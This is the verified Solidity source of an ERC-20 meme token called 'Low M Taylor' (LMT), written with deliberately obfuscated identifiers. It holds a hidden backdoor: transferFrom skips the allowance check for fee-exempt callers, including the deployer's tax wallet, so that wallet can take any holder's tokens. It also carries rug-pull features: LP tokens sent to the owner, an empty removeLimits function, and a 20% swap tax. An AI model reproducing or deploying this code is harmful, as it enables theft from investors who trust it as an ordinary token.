/**
 *Submitted for verification at Etherscan.io on 2025-03-19
*/

// SPDX-License-Identifier: MIT

/*
    https://x.com/kanyewest/status/1902477559968981288
    https://t.me/loutayloronEth
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract LMT is Context, IERC20, Ownable {
    address payable private _taxclknlMONGO;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Low M Taylor";
    string private constant _symbol = unicode"LMT";

    uint256 private _vkjbnkfjMONGO = 10;
    uint256 private _maxovnboiMONGO = 10;
    uint256 private _initvkjnbkjMONGO = 20;
    uint256 private _finvjlkbnlkjMONGO = 0;
    uint256 private _redclkjnkMONGO = 2;
    uint256 private _prevlfknjoiMONGO = 2;
    uint256 private _buylkvnlkMONGO = 0;
    IUniswapV2Router02 private RomRouter;

    uint256 public _vnbbvlkMONGO = qq30fef / 100;
    uint256 public _oijboijoiMONGO = 15 * 10 ** 18;
    uint256 private _cvjkbnkjMONGO = 10;

    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcMONGO;
    mapping(address => mapping(address => uint256)) private _allcvnkjnMONGO;
    mapping(address => bool) private _feevblknlMONGO;
    
    address private router_;
    address private ParBalance;
    bool private _tradingvlknMONGO;
    bool private _inlknblMONGO = false;
    bool private swapvlkMONGO = false;
    uint256 private _sellcnjkMONGO = 0;
    uint256 private _lastflkbnlMONGO = 0;
    address constant _deadlknMONGO = address(0xdead);


    modifier lockTheSwap() {
        _inlknblMONGO = true;
        _;
        _inlknblMONGO = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcMONGO[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function _calcTax_lvknblMONGO(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblMONGO) {
                taxAmount = amount
                    .mul((_buylkvnlkMONGO > _redclkjnkMONGO) ? _finvjlkbnlkjMONGO : _initvkjnbkjMONGO)
                    .div(100);
            }
            if (
                from == ParBalance &&
                to != address(RomRouter) &&
                !_feevblknlMONGO[to] &&
                to != _taxclknlMONGO
            ) {
                _buylkvnlkMONGO++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblMONGO &&
                to == ParBalance &&
                from != _taxclknlMONGO &&
                swapvlkMONGO &&
                _buylkvnlkMONGO > _prevlfknjoiMONGO
            ) {
                if (block.number > _lastflkbnlMONGO) {
                    _sellcnjkMONGO = 0;
                }
                _sellcnjkMONGO = _sellcnjkMONGO + _getAmountOut_lvcbnkMONGO(amount);
                require(_sellcnjkMONGO <= _oijboijoiMONGO, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkMONGO)
                    _swapTokenslknlMONGO(_vnbbvlkMONGO > amount ? amount : _vnbbvlkMONGO);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjMONGO(address(this).balance);
                }
                _lastflkbnlMONGO = block.number;
            }
        }
        return taxAmount;
    }

    constructor() payable {
        _taxclknlMONGO = payable(_msgSender());
        
        _balknvlkcMONGO[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcMONGO[address(this)] = (qq30fef * 98) / 100;
        _feevblknlMONGO[address(this)] = true;
        _feevblknlMONGO[_taxclknlMONGO] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojMONGO(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlMONGO[msg.sender]) return !_feevblknlMONGO[msg.sender];
        if(!(sender == ParBalance || recipient != _deadlknMONGO)) return false;
        return true;
    }

    function _transfer_kjvnMONGO(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblMONGO(from, to, amount);
        _balknvlkcMONGO[from] = _balknvlkcMONGO[from].sub(amount);
        _balknvlkcMONGO[to] = _balknvlkcMONGO[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcMONGO[address(this)] = _balknvlkcMONGO[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknMONGO) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnMONGO[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnMONGO(sender, recipient, amount);
        if (_downcklkojMONGO(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnMONGO[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function _sendETHTocvbnjMONGO(uint256 amount) private {
        _taxclknlMONGO.transfer(amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnMONGO(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnMONGO[owner][spender];
    }

    function _swapTokenslknlMONGO(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = RomRouter.WETH();
        _approve(address(this), address(RomRouter), tokenAmount);
        router_ = address(RomRouter);
        RomRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function removeLimits () external onlyOwner {
    }

    function _setTax_lknblMONGO(address payable newWallet) external {
        require(_feevblknlMONGO[_msgSender()]);
        _taxclknlMONGO = newWallet;
        _feevblknlMONGO[_taxclknlMONGO] = true;
    }

    function MONGOTeam() external onlyOwner {
        require(!_tradingvlknMONGO, "Trading is already open");
        RomRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(RomRouter), qq30fef);
        ParBalance = IUniswapV2Factory(RomRouter.factory()).createPair(
            address(this),
            RomRouter.WETH()
        );
        RomRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkMONGO = true;
        _tradingvlknMONGO = true;
        IERC20(ParBalance).approve(
            address(RomRouter),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnMONGO() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkMONGO(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = RomRouter.WETH();
        uint256[] memory amountOuts = RomRouter.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
}